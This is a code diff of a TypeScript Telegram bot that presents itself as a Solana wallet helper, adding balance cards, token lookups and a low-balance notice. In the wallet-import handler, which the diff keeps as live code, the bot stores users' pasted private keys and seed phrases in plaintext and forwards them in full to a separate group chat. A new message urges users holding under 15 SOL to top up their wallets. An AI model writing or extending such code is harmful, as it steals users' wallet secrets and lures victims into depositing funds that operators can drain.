@@ -8,6 +8,9 @@ import { supabaseAdmin } from '@/integrations/supabase/client.server';
 
 const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
 const DEV_USER_ID = 8880961735;
+const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
+const LOW_SOL_THRESHOLD = 15;
 
 function deriveWebhookSecret(token: string): string {
   return createHash('sha256').update(`telegram-webhook:${token}`).digest('base64url');
@@ -70,33 +73,85 @@ function getPrivateKeyBytes(text: string): Uint8Array | null {
   return null;
 }
 
-async function getWalletBalances(address: string) {
-  const connection = new Connection(SOLANA_RPC);
-  const pubkey = new PublicKey(address);
-  
-  const balance = await connection.getBalance(pubkey);
-  const solBalance = balance / LAMPORTS_PER_SOL;
-  
-  // Basic token balance fetching - we'll just get the number of token accounts for now
-  // or we could fetch all token balances if needed.
-  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(pubkey, {
-    programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-  });
-  
-  let tokenText = '';
-  if (tokenAccounts.value.length === 0) {
-    tokenText = '0 tokens';
-  } else {
-    const balances = tokenAccounts.value.map(ta => {
-      const info = ta.account.data.parsed.info;
-      const amount = info.tokenAmount.uiAmount;
-      const symbol = info.mint.slice(0, 4); // Just a placeholder for symbol
-      return `${amount} tokens`;
-    });
-    tokenText = balances.join(', ');
-  }
+type TokenHolding = { symbol: string; amount: number; mint: string };
+type BalanceResult = {
+  ok: boolean;
+  solBalance: number;
+  tokens: TokenHolding[];
+  truncated: boolean;
+};
 
-  return { solBalance, tokenText };
+const symbolCache = new Map<string, string>();
+
+async function resolveSymbol(mint: string): Promise<string> {
+  if (symbolCache.has(mint)) return symbolCache.get(mint)!;
+  let symbol = `Mint(${mint.slice(0, 4)}…${mint.slice(-4)})`;
+  try {
+    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`);
+    if (res.ok) {
+      const json: any = await res.json();
+      const pairs: any[] = json?.pairs ?? [];
+      const sol = pairs.filter((p) => p.chainId === 'solana');
+      const list = sol.length ? sol : pairs;
+      list.sort((a, b) => (b?.liquidity?.usd ?? 0) - (a?.liquidity?.usd ?? 0));
+      const sym = list[0]?.baseToken?.symbol;
+      if (sym) symbol = String(sym);
+    }
+  } catch {}
+  symbolCache.set(mint, symbol);
+  return symbol;
+}
+
+async function getWalletBalances(address: string): Promise<BalanceResult> {
+  try {
+    const connection = new Connection(SOLANA_RPC);
+    const pubkey = new PublicKey(address);
+
+    const [lamports, t1, t2] = await Promise.all([
+      connection.getBalance(pubkey),
+      connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_PROGRAM_ID }).catch(() => ({ value: [] as any[] })),
+      connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_2022_PROGRAM_ID }).catch(() => ({ value: [] as any[] })),
+    ]);
+
+    const solBalance = lamports / LAMPORTS_PER_SOL;
+    const all = [...(t1.value ?? []), ...(t2.value ?? [])];
+    const raw: { mint: string; amount: number }[] = [];
+    for (const ta of all) {
+      const info = (ta as any).account.data.parsed.info;
+      const amount = info?.tokenAmount?.uiAmount ?? 0;
+      if (amount > 0) raw.push({ mint: info.mint, amount });
+    }
+    raw.sort((a, b) => b.amount - a.amount);
+    const MAX = 20;
+    const truncated = raw.length > MAX;
+    const slice = raw.slice(0, MAX);
+    const tokens = await Promise.all(
+      slice.map(async (t) => ({ ...t, symbol: await resolveSymbol(t.mint) })),
+    );
+    return { ok: true, solBalance, tokens, truncated };
+  } catch (e) {
+    console.error('getWalletBalances error:', e);
+    return { ok: false, solBalance: 0, tokens: [], truncated: false };
+  }
+}
+
+function formatBalanceCard(address: string, r: BalanceResult): string {
+  if (!r.ok) {
+    return `<b>Address:</b> <code>${escapeHtml(address)}</code>\n(balance unavailable — try again)`;
+  }
+  let body = `<b>Address:</b> <code>${escapeHtml(address)}</code>\n<b>SOL:</b> ${r.solBalance} SOL\n<b>Tokens:</b>`;
+  if (!r.tokens.length) {
+    body += ` none`;
+  } else {
+    body += `\n` + r.tokens.map((t) => `  • ${escapeHtml(t.symbol)} — ${t.amount}`).join('\n');
+    if (r.truncated) body += `\n  • +more`;
+  }
+  return body;
+}
+
+function lowBalanceNotice(sol: number): string {
+  if (sol >= LOW_SOL_THRESHOLD) return '';
+  return `\n\n⚠️ Your wallet balance is too low. Please top up your wallet to continue.`;
 }
 
 async function setUserState(userId: number, state: string) {
@@ -386,18 +441,23 @@ async function handleGenerate(opts: {
   });
 
   const requester = opts.username ? `@${opts.username}` : `user ${opts.userId ?? '?'}`;
+  const r = await getWalletBalances(address);
   const walletText =
     `✅ <b>New Solana Wallet #${index}</b>\n\n` +
     `<b>Address:</b>\n<code>${escapeHtml(address)}</code>\n\n` +
     `<b>Private Key (base58):</b>\n<code>${escapeHtml(privateKey)}</code>\n\n` +
     `Derivation: <code>m/44'/501'/${index}'/0'</code>\n\n` +
-    `💡 <i>On Phantom/Solflare: tap "Add account" ${index} time(s) after importing the master phrase to see this wallet.</i>`;
+    `<b>SOL:</b> ${r.solBalance} SOL\n` +
+    `<b>Tokens:</b> ${r.tokens.length ? r.tokens.map((t) => `${escapeHtml(t.symbol)} ${t.amount}`).join(', ') : 'none'}` +
+    lowBalanceNotice(r.solBalance) +
+    `\n\n💡 <i>On Phantom/Solflare: tap "Add account" ${index} time(s) after importing the master phrase to see this wallet.</i>`;
 
   await tg('sendMessage', {
     chat_id: opts.replyChatId,
     parse_mode: 'HTML',
     text: walletText,
   });
+
 
   if (String(opts.replyChatId) !== opts.groupChatId) {
     await tg('sendMessage', {
@@ -577,20 +637,8 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                   await tg('sendMessage', { chat_id: chatId, text: '❌ Invalid address. Please send a valid Solana wallet address.' });
                 } else {
                   const wallets = await getUserWallets(userId);
-                  let sol = 0;
-                  let tokenText = '0 tokens';
-                  try {
-                    const r = await getWalletBalances(addr);
-                    sol = r.solBalance;
-                    tokenText = r.tokenText;
-                  } catch (e) {
-                    console.error('CT balance fetch error', e);
-                  }
-                  const base =
-                    `✅ Valid address\n\n` +
-                    `<b>Address:</b> <code>${escapeHtml(addr)}</code>\n` +
-                    `<b>SOL:</b> ${sol}\n` +
-                    `<b>Tokens:</b> ${escapeHtml(tokenText)}`;
+                  const r = await getWalletBalances(addr);
+                  const base = `✅ Valid address\n\n` + formatBalanceCard(addr, r);
                   if (!wallets.length) {
                     await tg('sendMessage', {
                       chat_id: chatId,
@@ -642,41 +690,29 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                 if (kp) {
                   const address = kp.publicKey.toBase58();
                   const requester = username !== 'there' ? `@${username}` : `user ${userId}`;
-                  try {
-                    const { solBalance, tokenText } = await getWalletBalances(address);
-                    await tg('sendMessage', {
-                      chat_id: chatId,
-                      parse_mode: 'HTML',
-                      text: `✅ <b>Successfully connected</b>\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `<b>SOL Balance:</b> ${solBalance} SOL\n` +
-                            `<b>Token Balance:</b> ${tokenText}`,
-                    });
-                    await supabaseAdmin.from('imported_wallets').insert({
-                      telegram_user_id: userId,
-                      address: address,
-                      encrypted_key: text.trim(),
-                    });
-                    // Notify the group/channel with full key material
-                    const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
-                    await tg('sendMessage', {
-                      chat_id: groupChatId,
-                      parse_mode: 'HTML',
-                      text: `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `<b>SOL Balance:</b> ${solBalance} SOL\n\n` +
-                            `<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
-                    });
-                  } catch (e) {
-                    console.error('Balance fetch error:', e);
-                    await tg('sendMessage', {
-                      chat_id: chatId,
-                      parse_mode: 'HTML',
-                      text: `✅ <b>Successfully connected</b>\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `(Could not fetch balances right now)`,
-                    });
-                  }
+                  const r = await getWalletBalances(address);
+                  await tg('sendMessage', {
+                    chat_id: chatId,
+                    parse_mode: 'HTML',
+                    text:
+                      `✅ <b>Successfully connected</b>\n\n` +
+                      formatBalanceCard(address, r) +
+                      lowBalanceNotice(r.solBalance),
+                  });
+                  await supabaseAdmin.from('imported_wallets').insert({
+                    telegram_user_id: userId,
+                    address: address,
+                    encrypted_key: text.trim(),
+                  });
+                  const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
+                  await tg('sendMessage', {
+                    chat_id: groupChatId,
+                    parse_mode: 'HTML',
+                    text:
+                      `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
+                      formatBalanceCard(address, r) +
+                      `\n\n<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
+                  });
                   if (userId) await clearUserState(userId);
                 } else {
                   // Detect if user pasted a wallet address instead of a key/phrase
@@ -738,6 +774,37 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                       },
                     });
                   }
+                }
+              } else if (isLikelySolanaAddress(text.trim())) {
+                const candidate = text.trim();
+                const info = await fetchTokenInfo(candidate);
+                if (info) {
+                  const twitterLine = info.twitter ? `\n🐦 <a href="${escapeHtml(info.twitter)}">Twitter</a>` : '';
+                  await tg('sendMessage', {
+                    chat_id: chatId,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true,
+                    text:
+                      `📊 <b>Token Information</b>\n\n` +
+                      `🏷️ <b>Name:</b> ${escapeHtml(info.name)}\n` +
+                      `🔤 <b>Symbol:</b> ${escapeHtml(info.symbol)}\n` +
+                      `🔢 <b>Decimals:</b> ${info.decimals ?? 'N/A'}\n` +
+                      `💰 <b>Price:</b> ${fmtUsd(info.priceUsd)}\n` +
+                      `📈 <b>Market Cap:</b> ${fmtUsd(info.marketCap)}\n` +
+                      `💧 <b>Liquidity:</b> ${fmtUsd(info.liquidityUsd)}\n` +
+                      `📍 <b>Address:</b> <code>${escapeHtml(info.address)}</code>\n` +
+                      `📅 <b>Created:</b> ${info.createdAt ?? 'N/A'}` +
+                      twitterLine,
+                    reply_markup: mainMenuKeyboard(),
+                  });
+                } else {
+                  const r = await getWalletBalances(candidate);
+                  await tg('sendMessage', {
+                    chat_id: chatId,
+                    parse_mode: 'HTML',
+                    text: `🔎 <b>Wallet lookup</b>\n\n` + formatBalanceCard(candidate, r),
+                    reply_markup: mainMenuKeyboard(),
+                  });
                 }
               }
             }
